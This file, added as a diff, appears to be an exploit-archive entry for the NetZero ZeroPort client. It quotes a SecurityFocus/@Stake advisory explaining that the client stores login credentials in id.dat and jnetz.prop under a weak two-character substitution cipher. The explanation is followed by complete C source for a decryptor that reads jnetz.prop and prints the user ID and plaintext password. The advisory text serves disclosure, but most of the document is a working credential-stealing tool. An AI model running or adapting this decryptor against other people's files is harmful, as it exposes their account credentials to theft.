@@ -1,0 +1,202 @@
+source: http://www.securityfocus.com/bid/1483/info
+
+Netzero is a free internet service provider which requires its users to run the application ZeroPort in order to log onto the network. The username and password is stored locally in a text file called id.dat and is inadequately encrypted. The weakly encrypted username and password may also be stored in jnetz.prop if the option "Save Password" is enabled.
+
+If a malicious user has access to the aforementioned files, they may decrypt the username and password using the exploit provided by Brian Carrier <bcarrier@atstake.com> or by using a simple substitution cipher. 
+
+Taken from the @Stake/L0pht advisory, Brian Carrier explains how to decrypt the username and password:
+
+The classical substitution cipher is a 1-to-1 mapping between 
+characters where each plaintext character is replaced by one ciphertext 
+character. For example, let P_i be the plaintext character in location 
+'i' and C_j be the ciphertext character in location 'j', then C_i is the 
+character that P_i maps to.
+
+The NetZero substitution cipher replaces each plaintext character by 
+two ciphertext characters, but the two ciphertext characters are not 
+stored together. When substituting character P_i of a password of length 
+'n', the first ciphertext character is C_i and the second character is 
+C_n+i. 
+
+The two ciphertext characters are derived from the following table:
+| 1 a M Q f 7 g T 9 4 L W e 6 y C
+--+----------------------------------
+g | ` a b c d e f g h i j k l m n o
+T | p q r s t u v w x y z { | } ~
+f | @ A B C D E F G H I J K L M N O 
+7 | P Q R S T U V W X Y Z [ \ ] ^ _
+Q | 0 1 2 3 4 5 6 7 8 9 : ; < = > ?
+M | SP ! " # $ % & ' ( ) * + , - . / 
+
+The characters inside the table represent the ASCII plaintext characters 
+and SP represents a space. 
+
+When encrypting a string, P, of length 'n', find each character in the 
+table and place the column header into C_i and place the row header into 
+C_n+i.
+
+For example:
+E(a) = ag 
+E(aa) = aagg 
+E(aqAQ1!) = aaaaaagTf7QM 
+E(`abcdefghijklmno) = 1aMQf7gT94LWe6yCgggggggggggggggg 
+
+When decrypting a string, C, of length '2n', then P_i will be the 
+element in the above table where the column headed by C_i and the row 
+headed by C_n+i intersect. 
+
+For example:
+D(af) = A
+D(aaff) = AA
+D(aaMMQQfgfgfg) = AaBbCc
+
+#include <stdio.h>
+#include <string.h>
+
+#define UID_SIZE	64
+#define PASS_CIPHER_SIZE	128
+#define PASS_PLAIN_SIZE	64
+#define BUF_SIZE 256
+
+const char decTable[6][16] = {
+  {'`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o'},
+  {'p','q','r','s','t','u','v','w','x','y','z','{','|','}','~',0},
+  {'@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O'},
+  {'P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_'},
+  {'0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?'},
+  {' ','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/'}
+};
+
+int nz_decrypt(char cCipherPass[PASS_CIPHER_SIZE], 
+  char cPlainPass[PASS_PLAIN_SIZE])
+{
+	int passLen, i, idx1, idx2;
+	passLen = strlen(cCipherPass)/2;
+	
+	if (passLen > PASS_PLAIN_SIZE)
+	{
+		printf("Error: Plain text array too small\n");
+		return 1;
+	}
+
+	for (i = 0; i < passLen; i++)
+	{
+		switch(cCipherPass[i])
+		{
+		case '1':
+			idx2 = 0; break;
+		case 'a':
+			idx2 = 1; break;
+		case 'M':
+			idx2 = 2; break;
+		case 'Q':
+			idx2 = 3; break;
+		case 'f':
+			idx2 = 4; break;
+		case '7':
+			idx2 = 5; break;
+		case 'g':
+			idx2 = 6; break;
+		case 'T':
+			idx2 = 7; break;
+		case '9':
+			idx2 = 8; break;
+		case '4':
+			idx2 = 9; break;
+		case 'L':
+			idx2 = 10; break;
+		case 'W':
+			idx2 = 11; break;
+		case 'e':
+			idx2 = 12; break;
+		case '6':
+			idx2 = 13; break;
+		case 'y':
+			idx2 = 14; break;
+		case 'C':
+			idx2 = 15; break;
+		default:
+			printf("Error: Unknown Cipher Text index: %c\n", cCipherPass[i]);
+			return 1;
+			break;
+		}
+
+		switch(cCipherPass[i+passLen])
+		{
+		case 'g':
+			idx1 = 0; break;
+		case 'T':
+			idx1 = 1; break;
+		case 'f':
+			idx1 = 2; break;
+		case '7':
+			idx1 = 3; break;
+		case 'Q':
+			idx1 = 4; break;
+		case 'M':
+			idx1 = 5; break;
+		default:
+			printf("Error: Unknown Cipher Text Set: %c\n", 
+			  cCipherPass[i+passLen]);
+			return 1;
+			break;
+		}
+
+		cPlainPass[i] = decTable[idx1][idx2];
+	}
+	cPlainPass[i] = 0;
+
+	return 0;
+}
+
+int main(void)
+{
+	FILE *hParams;
+	char cBuffer[BUF_SIZE], cUID[UID_SIZE];
+	char cCipherPass[PASS_CIPHER_SIZE], cPlainPass[PASS_PLAIN_SIZE];
+	int done = 2;
+
+	printf("\nNet Zero Password Decryptor\n");
+	printf("Brian Carrier [bcarrier@atstake.com]\n");
+	printf("@Stake L0pht Research Labs\n");
+	printf("http://www.atstake.com\n\n");
+
+	if ((hParams = fopen("jnetz.prop","r")) == NULL)
+	{
+		printf("Unable to find jnetz.prop file\n");
+		return 1;
+	}	
+
+	while ((fgets(cBuffer, BUF_SIZE, hParams) != NULL) && (done > 0))
+	{
+		if (strncmp(cBuffer, "ProfUID=", 8) == 0)
+		{
+			done--;
+			strncpy(cUID, cBuffer + 8, UID_SIZE);
+			printf("UserID: %s", cUID);
+		}
+
+		if (strncmp(cBuffer, "ProfPWD=", 8) == 0)
+		{
+			done--;
+			strncpy(cCipherPass, cBuffer + 8, PASS_CIPHER_SIZE);
+			printf("Encrypted Password: %s", cCipherPass);
+
+			if (nz_decrypt(cCipherPass, cPlainPass) != 0)
+				return 1;
+			else
+				printf("Plain Text Password: %s\n", cPlainPass);
+		}
+
+	}
+
+	fclose(hParams);
+
+	if (done > 0)
+	{
+		printf("Invalid jnetz.prop file\n");
+		return 1;
+	} else {
+		return 0;
+	}
+}
